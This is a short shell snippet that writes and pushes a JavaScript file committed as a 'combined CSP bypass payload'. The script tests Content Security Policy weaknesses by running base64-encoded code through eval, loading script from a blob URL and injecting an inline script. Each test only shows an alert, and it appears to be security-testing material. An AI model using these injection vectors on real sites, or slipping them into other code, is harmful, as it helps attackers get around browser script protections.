echo "(() => {
  const b64 = \"YWxlcnQoJ0JZUFBBUyBPSycpOw==\";
  const decoded = atob(b64);
  eval(decoded);
  const blob = new Blob([`alert('BLOB OK')`], {type: 'application/javascript'});
  const url = URL.createObjectURL(blob);
  const s = document.createElement('script');
  s.src = url;
  document.head.appendChild(s);
  const inlineScript = document.createElement('script');
  inlineScript.textContent = \"alert('INLINE OK')\";
  document.head.appendChild(inlineScript);
})();" > p.js

git add p.js
git commit -m "Add combined CSP bypass payload"
git push
